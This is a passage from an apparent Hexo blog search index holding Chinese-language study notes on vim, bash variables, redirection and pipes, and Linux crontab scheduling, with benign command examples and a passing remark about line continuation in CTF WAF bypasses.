        <tags>
            
            <tag> web </tag>
            
            <tag> php </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>shell与shell script</title>
      <link href="/2021/12/03/shell%E4%B8%8Eshell-script/"/>
      <url>/2021/12/03/shell%E4%B8%8Eshell-script/</url>
      
        <content type="html"><![CDATA[<h1 id="vim程序编辑器"><a href="#vim程序编辑器" class="headerlink" title="vim程序编辑器"></a>vim程序编辑器</h1><h2 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a>基本概念</h2><h3 id="vim与vi"><a href="#vim与vi" class="headerlink" title="vim与vi"></a>vim与vi</h3><p>vim是vi的高级版本，vim有语法高亮等</p><h2 id="vi-x2F-vim的使用"><a href="#vi-x2F-vim的使用" class="headerlink" title="vi&#x2F;vim的使用"></a>vi&#x2F;vim的使用</h2><h3 id="编辑模式"><a href="#编辑模式" class="headerlink" title="编辑模式"></a>编辑模式</h3><p>打开即是默认模式（一般模式）,输入i&#x2F;o&#x2F;r&#x2F;a任意一个字母会进入编辑模式，不限制大小写，i&#x2F;o&#x2F;a是插入，r是替换</p><blockquote><p>替换模式：直接键入字符，替换光标所在字符</p><p>在vi里，tab键得到结果和空格符得到的结果不一样</p></blockquote><h3 id="命令行模式"><a href="#命令行模式" class="headerlink" title="命令行模式"></a>命令行模式</h3><p>一般模式中，输入<code>:</code> <code>/</code> <code>?</code>3个中的一个就可以进入命令行模式</p><h3 id="返回一般模式"><a href="#返回一般模式" class="headerlink" title="返回一般模式"></a>返回一般模式</h3><p>Esc + <code>:wq</code></p><blockquote><p>强制写入<code>:wq!</code> 前提是可以改权限</p><ul><li>w 写入 （也可以w[filename]表示为另存为）</li><li>q 离开</li><li>ZZ 没改动就不保存离开，改动就保存后离开</li></ul></blockquote><h3 id="移动光标"><a href="#移动光标" class="headerlink" title="移动光标"></a>移动光标</h3><p>在一般模式下，除长按外，可以先写次数再按键(<code>30-&gt;</code>为光标向右移动30个字符)</p><blockquote><p>直接输，输入不会回显在屏幕上</p></blockquote><div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">[Ctrl] + [f] 屏幕“向下”移动一页，相当于 [Page Down]按键 （常用）</span><br><span class="line">[Ctrl] + [b] 屏幕“向上”移动一页，相当于 [Page Up] 按键（常用）</span><br><span class="line">[Ctrl] + [d] 屏幕“向下”移动半页</span><br><span class="line">[Ctrl] + [u] 屏幕“向上”移动半页</span><br><span class="line">+           光标移动到非空白字符的下一行</span><br><span class="line">-           光标移动到非空白字符的上一行</span><br><span class="line">n + 空格键  光标会向右移动这一行的 n 个字符</span><br><span class="line">0 或功能键[Home] 移动到这一行的最前面字符处（常用）</span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">或功能键[End]  移动到这一行的最后面字符处（常用）</span></span><br><span class="line">H  光标移动到这个屏幕的最上方那一行的第一个字符</span><br><span class="line">M  光标移动到这个屏幕的中央那一行的第一个字符</span><br><span class="line">L  光标移动到这个屏幕的最下方那一行的第一个字符</span><br><span class="line">G  移动到这个文件的最后一行（常用）</span><br><span class="line">nG 移动到这个文件的第 n 行</span><br><span class="line">gg 移动到这个文件的第一行，相当于 1G</span><br><span class="line">n&lt;Enter&gt;  光标向下移动 n 行</span><br></pre></td></tr></table></figure></div><h3 id="块选择–visual-block模式"><a href="#块选择–visual-block模式" class="headerlink" title="块选择–visual block模式"></a>块选择–visual block模式</h3><p>在一般模式中按下v或V进入</p><p>此时光标经过位置会被选中，可以进行以下具体操作</p><div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">y 将选中的地方复制起来</span><br><span class="line">d 将选中的地方删除</span><br><span class="line">p 将刚刚y的内容粘贴</span><br></pre></td></tr></table></figure></div><blockquote><p>复制的内容只在当前vim窗口生效，没有进入电脑剪切板</p></blockquote><h3 id="多文件编辑"><a href="#多文件编辑" class="headerlink" title="多文件编辑"></a>多文件编辑</h3><p>:n 编辑下一个文件</p><p>:N 编辑上一个文件</p><p>:files 列出目前这个vim的打开的所有文件</p><blockquote><p>vim后面可以跟多个文件名,如果有文件内容相同的文件，只会读取第一个，后面重复的会直接跳过</p></blockquote><h3 id="多窗口"><a href="#多窗口" class="headerlink" title="多窗口"></a>多窗口</h3><p>:sp[filename]</p><blockquote><p>filename可有可无，如果想在新窗口启动另一个文件，就加filename，否则默认在使当前文件出现在两个窗口</p></blockquote><p>ctrl+w+j 移到下面的窗口</p><p>ctrl+w+k 移到上面的窗口</p><p>ctrl+w+q 退出</p><h2 id="vim环境设置"><a href="#vim环境设置" class="headerlink" title="vim环境设置"></a>vim环境设置</h2><h3 id="x2F-viminfo"><a href="#x2F-viminfo" class="headerlink" title="~&#x2F;.viminfo"></a>~&#x2F;.viminfo</h3><p>主动记录操作</p><h3 id="x2F-vimrc-环境设置参数"><a href="#x2F-vimrc-环境设置参数" class="headerlink" title="~&#x2F;.vimrc 环境设置参数"></a>~&#x2F;.vimrc 环境设置参数</h3><p><strong>set nu</strong><br><strong>set nonu</strong></p><blockquote><p>设置行号</p></blockquote><p><strong>set hlsearch</strong><br><strong>set noglsear</strong></p><p>hlsearch(&#x3D;high light search 高亮度查找)，设置是否将查找的<a class="link"   href="https://so.csdn.net/so/search?q=%E5%AD%97%E7%AC%A6%E4%B8%B2&spm=1001.2101.3001.7020" >字符串 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>反白的设置值</p><p><strong>set autoindent</strong><br><strong>set noautoindent</strong></p><blockquote><p>表示是否自动缩排</p></blockquote><p><strong>set backup</strong><br><strong>set nobackup</strong></p><blockquote><p>表示自动保存备份文件，一般设置为 nobackup ，如果设置为backup的话，当你改动任何一个文件时，原文件会被保存成一个文件名为 filename~ 的文件。</p></blockquote><p><strong>set ruler</strong></p><blockquote><p>设置右下角的状态栏说明</p></blockquote><p><strong>set showmode</strong></p><blockquote><p>显示 insert 之类的字</p></blockquote><p><strong>set backspace&#x3D;(0 1 2)</strong></p><blockquote><p>设置 2 表示进入编辑模式后可以删除任意字符， 设置 0 或 1 表示进入编辑模式后只能删除刚才输入的字符，不能删除原本就存在的字符了</p></blockquote><p><strong>set all</strong></p><blockquote><p>显示目前所有的环境参数设置值</p></blockquote><p><strong>set</strong></p><blockquote><p>显示与系统默认值不同的设置参数，就是用户自己变动过的设置参数</p></blockquote><p><strong>syntax on</strong><br><strong>syntax off</strong></p><blockquote><p>是否根据程序相关语法显示不同颜色。</p></blockquote><p><strong>set bg&#x3D;dark</strong><br><strong>set bg&#x3D;light</strong></p><blockquote><p>显示不同的底色色调</p></blockquote><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/202407032334530.jpg"                      alt="image-20220918163650086"                ><figcaption>image-20220918163650086</figcaption></figure></p><h2 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h2><h3 id="中文编码"><a href="#中文编码" class="headerlink" title="中文编码"></a>中文编码</h3><p>一般都为utf8,但若vim打开big5编码，会有乱码，此时可以设置LANG属性</p><div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">➜  test LANG=zh_CN.big5</span><br></pre></td></tr></table></figure></div><h3 id="语系编码转换"><a href="#语系编码转换" class="headerlink" title="语系编码转换"></a>语系编码转换</h3><div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">iconv [options]</span><br><span class="line">iconv -f 原编码 -t 新编码 filename [-o newfile]</span><br><span class="line">--list 列出支持的语系数据</span><br><span class="line">-f 后接原来的编码格式</span><br><span class="line">-t 后接后来的🆕编码格式</span><br><span class="line">-o file 如果要保留原本的文件，那么使用-o 新文件名，可以建立新编码文件</span><br></pre></td></tr></table></figure></div><h1 id="bash"><a href="#bash" class="headerlink" title="bash"></a>bash</h1><h2 id="基本功能"><a href="#基本功能" class="headerlink" title="基本功能"></a>基本功能</h2><h3 id="命令记忆能力-history"><a href="#命令记忆能力-history" class="headerlink" title="命令记忆能力 history"></a>命令记忆能力 history</h3><p>可以查看之前用过的命令</p><h3 id="命令与文件补全功能-Tab键"><a href="#命令与文件补全功能-Tab键" class="headerlink" title="命令与文件补全功能(Tab键)"></a>命令与文件补全功能(Tab键)</h3><p><code>c[Tab][Tab]</code> 回显所有c开头命令</p><blockquote><p>一串命令的第一个字后加Tab则为命令补全</p><p>第二个字后加Tab为文件补齐</p></blockquote><h3 id="命令设置别名-alias"><a href="#命令设置别名-alias" class="headerlink" title="命令设置别名 alias"></a>命令设置别名 alias</h3><p><code>alias lm=&#39;ls -al&#39;</code> 相当于给<code>ls -al</code>命令加了个缩写标识符，输入lm则会执行该命令</p><h3 id="控制"><a href="#控制" class="headerlink" title="控制"></a>控制</h3><p>ctrl+c 中断进程</p><h3 id="shell-script"><a href="#shell-script" class="headerlink" title="shell script"></a>shell script</h3><p>可以批量处理文件</p><h3 id="通配符"><a href="#通配符" class="headerlink" title="通配符"></a>通配符</h3><h3 id="type命令"><a href="#type命令" class="headerlink" title="type命令"></a>type命令</h3><div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">type [-tpa] name</span><br><span class="line">不加任何options时，会回显name是内置命令还是外置命令</span><br><span class="line">-t 回显为 file/alias/builtion 分别表示外部命令、别名、内置命令</span><br><span class="line">-p name为外部命令时回显完整文件名</span><br><span class="line">-a 从PATH变量定义的路径中，将含name的命令都列出来，包含alias</span><br></pre></td></tr></table></figure></div><h3 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h3><p>可支持多行执行，这也有利于ctf题目中的绕过waf</p><p>主要利用反斜杠<code>\</code>,原理为将功能为命令执行的回车符转义了，使得命令可以在下一行继续输入（终端中会以&gt;开头提示输入）</p><div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">➜  test cp 1 2 \</span><br><span class="line"><span class="meta prompt_">&gt; </span><span class="language-bash">test1</span></span><br></pre></td></tr></table></figure></div><h2 id="shell变量"><a href="#shell变量" class="headerlink" title="shell变量"></a>shell变量</h2><p>一般大写的是系统默认变量(PATH、SHELL、HOME等)，小写是命令</p><blockquote><p>如果要<code>echo</code>内置变量，要在变量名前加<code>$</code></p></blockquote><h3 id="变量的显示与设置"><a href="#变量的显示与设置" class="headerlink" title="变量的显示与设置"></a>变量的显示与设置</h3><ul><li><p>打印 <code>echo $变量名</code> &#x2F; <code>echo $&#123;变量名&#125;</code></p></li><li><p>设置 </p><ul><li><code>变量名=值</code></li></ul></li><li><p>设置规则</p><ul><li>等号两边不能有空格，赋值及变量名中也不能有空格(如果值被双引号或单引号包裹时可以有空格符)</li><li>单双引号包裹内容区别：双引号包裹的$字符可以解析变量，因此可以插入变量，单引号就是纯文本</li><li>可以用转义字符转义特殊字符</li><li>变量名只能是数字字母，不能数字开头</li><li>变量赋值双引号中可以插入命令<code>$(命令)</code>，将命令执行的结果插入赋值中</li><li>当要在子进程中使用该变量时，<code>export 变量名</code>使其变成环境变量<ul><li>但是重启当前父shell窗口后又会被清空，若要永久使用，要在配置文件中加export或alias语句(zsh配置文件为<code>~/.zshrc</code>或<code>~/.zprofile</code>),设置为记得source一下配置文件</li></ul></li></ul></li><li><p>取消变量 <code>unset 变量名</code></p></li></ul><blockquote><p>exit 离开当前子进程</p><p>在当前shell下，另开一个shell就相当于子进程，父进程的自定义变量无法在子进程中使用，但是export变成环境变量后就可以在子进程中使用</p></blockquote><h3 id="环境变量功能"><a href="#环境变量功能" class="headerlink" title="环境变量功能"></a>环境变量功能</h3><p><code>env</code> 查看当前shell环境变量，即export的变量，alias不包括其中</p><p>常见环境变量</p><div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">HOME  ～的路径</span><br><span class="line">SHELL  当前shell程序</span><br><span class="line">HISTSIZ  最多纪录的历史命令条数</span><br><span class="line">MAIL  使用mail命令时读取的邮箱文件</span><br><span class="line">PATH  执行文件查找的路径，目录与目录间以 : 分隔，若已安装的外部命令的可执行文件没有被加入   PATH中，会回显`zsh: command not found: aaaa`,同时若有同名命令，按PATH中的顺序 使用第一个</span><br><span class="line">LANG  语系数据</span><br><span class="line">RANDOM  随机数，在bash中时0~32767,若要生成0~9,使用declare </span><br><span class="line">`declare -i number=$RANDOM%10;echo $number`</span><br><span class="line">也可以</span><br><span class="line">`declare -i number=$RANDOM*10/32768;echo $number`</span><br></pre></td></tr></table></figure></div><blockquote><p>set命令可以查看所有变量（环境变量与自定义变量）</p></blockquote><h3 id="变量的测试与替换"><a href="#变量的测试与替换" class="headerlink" title="变量的测试与替换"></a>变量的测试与替换</h3><p>语法：new_var&#x3D;${old_var-content} :一般new_var与old_var都写成同一个变量，这样相当于测试变量是否存在</p><p><code>username=$&#123;username-root&#125;</code> ：如果变量没有设置（即没有这个变量），就赋值root，如果设置就不改</p><blockquote><p>如果变量是空字符串，那直接echo和echo一个不存在变量的内容是一样的，因此直接echo不能判断变量是不是存在</p></blockquote><p>如果一定要给空字符串设置</p><div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">new_var=$&#123;old_var:-content&#125;</span><br></pre></td></tr></table></figure></div><blockquote><p>加<code>:</code>后,变量为空或是未设置都能被替换</p></blockquote><h3 id="设置别名"><a href="#设置别名" class="headerlink" title="设置别名"></a>设置别名</h3><p>alias</p><p>unalias</p><h3 id="通配符与特殊符号"><a href="#通配符与特殊符号" class="headerlink" title="通配符与特殊符号"></a>通配符与特殊符号</h3><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/202407032334772.jpg"                      alt="image-20220919190354111"                ><figcaption>image-20220919190354111</figcaption></figure></p><h2 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h2><h3 id="配置文件"><a href="#配置文件" class="headerlink" title="配置文件"></a>配置文件</h3><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/202407032334378.jpg"                      alt="image-20220919185418826"                ><figcaption>image-20220919185418826</figcaption></figure></p><h3 id="读取"><a href="#读取" class="headerlink" title="读取"></a>读取</h3><p>source 配置文件名</p><h3 id="环境设置"><a href="#环境设置" class="headerlink" title="环境设置"></a>环境设置</h3><p><code>stty [-a] </code>列出所有按键和其对应内容</p><p>stty erase [按键内容] 设置删除字符键的快捷键</p><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/202407032334549.jpg"                      alt="image-20220919185933635"                ><figcaption>image-20220919185933635</figcaption></figure></p><h2 id="数据流重定向"><a href="#数据流重定向" class="headerlink" title="数据流重定向"></a>数据流重定向</h2><h3 id="gt"><a href="#gt" class="headerlink" title="&gt;"></a>&gt;</h3><p>命令 &gt; 文件 ：将命令输出结果输入到文件（但是会覆盖）</p><h3 id="gt-gt"><a href="#gt-gt" class="headerlink" title="&gt;&gt;"></a>&gt;&gt;</h3><p>命令 &gt;&gt; 文件 ：将命令输出结果追加到文件末尾</p><blockquote><p><code>&gt;</code>与<code>&gt;&gt;</code>都会在文件不存在时自动创建</p></blockquote><h3 id="输出与错误输出"><a href="#输出与错误输出" class="headerlink" title="输出与错误输出"></a>输出与错误输出</h3><ul><li>1&gt; 以覆盖到方法将正确的数据输出到指定的文件或设备上</li><li>1&gt;&gt; 以累加的方法将正确的数据输出到指定的文件或设备上</li><li>2&gt; 以覆盖到方法将错误的数据输出到指定的文件或设备上</li><li>2&gt;&gt; 以累加到方法将错误的数据输出到指定的文件或设备上</li></ul><blockquote><p>错误的数据输出就相当于报错信息</p></blockquote><p>e.g.将错误信息丢弃</p><div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find /home -name .bashrc 2&gt; /dev/null</span><br></pre></td></tr></table></figure></div><blockquote><p>&#x2F;dev&#x2F;null垃圾桶黑道，可以吃掉任何传入信息</p></blockquote><p>e.g.将错误和正确信息都写到同一个文件中</p><div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">find /home -name test &gt; list 2&gt;&amp;1</span><br><span class="line">或</span><br><span class="line">find /home -name test &amp;&gt; list </span><br></pre></td></tr></table></figure></div><h3 id="lt"><a href="#lt" class="headerlink" title="&lt;"></a>&lt;</h3><p>接收文件 &lt; 输入文件 ：用输入文件的内容来代替键盘输入</p><h3 id="lt-lt"><a href="#lt-lt" class="headerlink" title="&lt;&lt;"></a>&lt;&lt;</h3><p>结束输入</p><div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">➜  desktop cat &gt; catfile &lt;&lt; &quot;eof&quot;</span><br><span class="line"><span class="meta prompt_">heredoc&gt; </span><span class="language-bash">as</span></span><br><span class="line"><span class="meta prompt_">heredoc&gt; </span><span class="language-bash">dsdsds</span></span><br><span class="line"><span class="meta prompt_">heredoc&gt; </span><span class="language-bash">sdsdsd</span></span><br><span class="line"><span class="meta prompt_">heredoc&gt; </span><span class="language-bash">eof</span></span><br></pre></td></tr></table></figure></div><blockquote><p>&lt;&lt;后跟结束输入关键字，这样就不用ctrl+d来结束</p><p>单纯的输入<code>cat &gt; catfile</code>来编写catfile需要ctrl+d来结束</p></blockquote><h2 id="管道命令"><a href="#管道命令" class="headerlink" title="管道命令"></a>管道命令</h2><h3 id="连接符"><a href="#连接符" class="headerlink" title="连接符"></a>连接符</h3><ul><li>;   连续命令执行,<code>cmd;cmd</code></li><li>cmd1 &amp;&amp; cmd2   1成功执行且为正确才执行2，否则2不执行</li><li>cmd1 || cmd2   1成功执行且正确，2不执行，否则执行2</li></ul><h3 id="管道符"><a href="#管道符" class="headerlink" title="管道符"></a>管道符</h3><p>cmd1 ｜ cmd2   cmd1的输出作为cmd2的输入，管道符会忽略报错输出</p><h3 id="选取命令"><a href="#选取命令" class="headerlink" title="选取命令"></a>选取命令</h3><ul><li>cut 选取信息中的部分<ul><li>cut -d ‘分隔字符’ -f 输出行数(多行的话逗号连接)</li><li>cut -c 字符范围<ul><li>cut -c 12- 取得第12字符以后的内容</li></ul></li></ul></li><li>grep ：查找单位为行<ul><li>可搭配管道符 <code>cmd | grep &#39;查找字符串&#39;</code> 将cmd输出结果中含查找字符的都显示出来<ul><li>-a 将二进制文件以text文件方式查找数据</li><li>-c 计算找到查找字符串的次数</li><li>-i 大小写不敏感</li><li>-n 输出时加上行号</li><li>-v 反向选择，找不含查找字符串的行</li><li>–color&#x3D;auto 找到的关键字部分加上颜色</li></ul></li></ul></li></ul><h3 id="排序命令"><a href="#排序命令" class="headerlink" title="排序命令"></a>排序命令</h3><p>sort</p><p>uniq 重复数据只出现一个</p><p>wc  统计文件字符数行数,-l 列出行数 -w 列出字数（英文单字） -m 字符数</p><h3 id="双向重定向"><a href="#双向重定向" class="headerlink" title="双向重定向"></a>双向重定向</h3><p>tee 同时将数据流传给文件与屏幕</p><div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tee [-a] file</span><br></pre></td></tr></table></figure></div><p>e.g. 将执行结果转存一份，同时屏幕上也可以看到</p><p><code>last | tee last.list | cut -d &quot; &quot; -f 1</code></p><h3 id="字符转换命令"><a href="#字符转换命令" class="headerlink" title="字符转换命令"></a>字符转换命令</h3><p>tr 删除或替换</p><p>col 常用于将man page转存为纯文本文件方便查询</p><p>join 合并两个文件(可选操作多)</p><p>paste 直接拼接两个文件，[tab]隔开</p><p>expand 将tab转空格</p>]]></content>
      
      
      <categories>
          
          <category> foundation </category>
          
      </categories>
      
      
        <tags>
            
            <tag> linux </tag>
            
            <tag> shell </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux定时任务</title>
      <link href="/2021/10/07/Linux%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1/"/>
      <url>/2021/10/07/Linux%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1/</url>
      
        <content type="html"><![CDATA[<h1 id="Linux定时任务"><a href="#Linux定时任务" class="headerlink" title="Linux定时任务"></a>Linux定时任务</h1><p><a class="link"   href="https://www.jianshu.com/p/f87f17cba27b" >https://www.jianshu.com/p/f87f17cba27b <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p><h2 id="crond简介"><a href="#crond简介" class="headerlink" title="crond简介"></a>crond简介</h2><p>crond进程每分钟会定期检查是否有要执行的任务，如果有要执行的任务，则自动执行该任务。该系统服务默认启动，linux系统也提供了使用者控制计划任务的命令：crontab命令。</p><h3 id="相关配置文件"><a href="#相关配置文件" class="headerlink" title="相关配置文件"></a>相关配置文件</h3><ul><li><p><code>/var/spool/cron/crontabs/</code> 目录下存放的是每个用户包括root的crontab任务，每个任务以创建者的名字命名。</p></li><li><p><code>/etc/crontab</code> 这个文件负责调度各种管理和维护任务。</p></li><li><p><code>/etc/cron.d/</code> 这个目录用来存放任何要执行的crontab文件或脚本。</p></li><li><p>我们还可以把脚本放在<code>/etc/cron.hourly</code>、<code>/etc/cron.daily</code>、<code>/etc/cron.weekly</code>、<code>/etc/cron.monthly</code>目录中，让它每小时&#x2F;天&#x2F;星期&#x2F;月执行一次。</p></li></ul><h3 id="Linux下任务调度"><a href="#Linux下任务调度" class="headerlink" title="Linux下任务调度"></a>Linux下任务调度</h3><ul><li>系统任务调度：系统周期性所要执行的工作，比如写缓存数据到硬盘、日志清理等。<code>/etc/crontab</code>文件就是系统任务调度的配置文件。</li><li>用户任务调度：用户定期要执行的工作，比如用户数据备份、定时邮件提醒等。用户可以使用 crontab 工具来定制自己的计划任务。所有用户定义的crontab文件都被保存在 <code>/var/spool/cron/crontabs/</code>目录中，其文件名与用户名一致。</li></ul><h2 id="crontab文件"><a href="#crontab文件" class="headerlink" title="crontab文件"></a>crontab文件</h2><p>查看<code>/etc/crontab</code>，内容为：</p><div class="highlight-container" data-rel="Ruby"><figure class="iseeu highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># /etc/crontab: system-wide crontab</span></span><br><span class="line"><span class="comment"># Unlike any other crontab you don&#x27;t have to run the `crontab&#x27;</span></span><br><span class="line"><span class="comment"># command to install the new version when you edit this file</span></span><br><span class="line"><span class="comment"># and files in /etc/cron.d. These files also have username fields,</span></span><br><span class="line"><span class="comment"># that none of the other crontabs do.</span></span><br><span class="line"></span><br><span class="line"><span class="variable constant_">SHELL</span>=<span class="regexp">/bin/sh</span></span><br><span class="line"><span class="variable constant_">PATH</span>=<span class="regexp">/usr/local</span><span class="regexp">/sbin:/usr</span><span class="regexp">/local/bin</span><span class="symbol">:/sbin</span><span class="symbol">:/bin</span><span class="symbol">:/usr/sbin</span><span class="symbol">:/usr/bin</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># m h dom mon dow user  command</span></span><br><span class="line"><span class="number">17</span> *    * * *   root    cd / &amp;&amp; run-parts --report /etc/cron.hourly</span><br><span class="line"><span class="number">25</span> <span class="number">6</span>    * * *   root    test -x /usr/sbin/anacron |<span class="params"></span>| ( cd / &amp;&amp; run-parts --report /etc/cron.daily )</span><br><span class="line"><span class="number">47</span> <span class="number">6</span>    * * <span class="number">7</span>   root    test -x /usr/sbin/anacron |<span class="params"></span>| ( cd / &amp;&amp; run-parts --report /etc/cron.weekly )</span><br><span class="line"><span class="number">52</span> <span class="number">6</span>    <span class="number">1</span> * *   root    test -x /usr/sbin/anacron |<span class="params"></span>| ( cd / &amp;&amp; run-parts --report /etc/cron.monthly )</span><br></pre></td></tr></table></figure></div><p>第一行SHELL变量指定了系统要使用哪个shell；第二行PATH变量指定了系统执行 命令的路径。<br>接下来的命令格式为：<br><code>m h dom mon dow user command</code><br>英文全拼为：<br><code>minute hour day month week user commond</code></p><ul><li>minute：表示分钟，可以是从0到59之间的任何整数。</li><li>hour：表示小时，可以是从0到23之间的任何整数。</li><li>day：表示日期，可以是从1到31之间的任何整数。</li><li>month：表示月份，可以是从1到12之间的任何整数。</li><li>week：表示星期几，可以是从0到7之间的任何整数，<u>这里的0或7代表星期日</u>。</li><li>user：表示用户。</li><li>command：要执行的命令，可以是系统命令，也可以是自己编写的脚本文件。</li></ul><blockquote><p> 注意<code>/var/spool/cron</code>目录中的用户调度任务，没有user一项，因为文件名已经代表了user。</p></blockquote><p>在以上各个字段中，还可以使用以下特殊字符：</p><ul><li>星号（*）：代表所有可能的值，例如month字段如果是星号，则表示在满足其它字段的制约条件后每月都执行该命令操作。</li><li>逗号（,）：可以用逗号隔开的值指定一个列表范围，例如，“1,2,5,7,8,9”</li><li>中杠（-）：可以用整数之间的中杠表示一个整数范围，例如“2-6”表示“2,3,4,5,6”</li><li>正斜线（&#x2F;）：可以用正斜线指定时间的间隔频率，例如“0-23&#x2F;2”表示每两小时执行一次。</li><li>同时正斜线可以和星号一起使用，例如*&#x2F;10，如果用在minute字段，表示每十分钟执行一次。</li></ul><h2 id="crontab命令"><a href="#crontab命令" class="headerlink" title="crontab命令"></a>crontab命令</h2><div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">crontab [-u username] [file] [ -e | -l | -r]</span><br><span class="line">-u 指定设置某用户crontab</span><br><span class="line">file 将file作为crontab的任务列表文件</span><br><span class="line">-e 编辑某用户crontab</span><br><span class="line">-l 显示某用户crontab</span><br><span class="line">-r 删除某用户crontab</span><br></pre></td></tr></table></figure></div>]]></content>
      
      
      <categories>
          
          <category> foundation </category>
          
      </categories>
      
      
        <tags>
            
            <tag> linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux与MAC文件、目录与磁盘格式</title>
      <link href="/2021/09/23/Linux%E4%B8%8EMAC%E6%96%87%E4%BB%B6%E3%80%81%E7%9B%AE%E5%BD%95%E4%B8%8E%E7%A3%81%E7%9B%98%E6%A0%BC%E5%BC%8F/"/>
      <url>/2021/09/23/Linux%E4%B8%8EMAC%E6%96%87%E4%BB%B6%E3%80%81%E7%9B%AE%E5%BD%95%E4%B8%8E%E7%A3%81%E7%9B%98%E6%A0%BC%E5%BC%8F/</url>
      
        <content type="html"><![CDATA[<h1 id="Linux与MAC-OS文件、目录学习笔记"><a href="#Linux与MAC-OS文件、目录学习笔记" class="headerlink" title="Linux与MAC OS文件、目录学习笔记"></a>Linux与MAC OS文件、目录学习笔记</h1><h2 id="0x01-文件权限"><a href="#0x01-文件权限" class="headerlink" title="0x01 文件权限"></a>0x01 文件权限</h2><h3 id="用户与用户组"><a href="#用户与用户组" class="headerlink" title="用户与用户组"></a>用户与用户组</h3><p>在Linux或MAC下多个用户可以共用一个系统&#x2F;一台服务器，因此系统既要包含各用户<strong>共用文件</strong>及各自<strong>私有文件</strong>，在这种情况下权限配置显得极其重要。但是若用户间是合作团队关系，可以互相访问各自私有文件，若还是采用分别对用户进行文件访问授权，显得效率低下，因此产生了用户组，使得组内用户获得与组相同权限，用户组实质上是具有相同特征用户的逻辑集合。</p><h4 id="root用户及其用户组"><a href="#root用户及其用户组" class="headerlink" title="root用户及其用户组"></a>root用户及其用户组</h4><p>Linux中，对于任何一个文件都有”User,Group,Others”3种身份，而对于文件来说root用户便是与User拥有等同权限的特殊Others。root用户组与普通用户组也一样受权限限制，组内用户并没有与root用户等同甚至更高权限。</p><p>而MAC下由于引入系统完整性保护（SIP）机制，连root用户都无法在&#x2F;、&#x2F;usr目录下新建文件</p><blockquote><p>SIP机制一般不建议关闭，在不关闭前提下仍可以利用软链接的方式在根目录下创建替身</p></blockquote><h3 id="文件权限"><a href="#文件权限" class="headerlink" 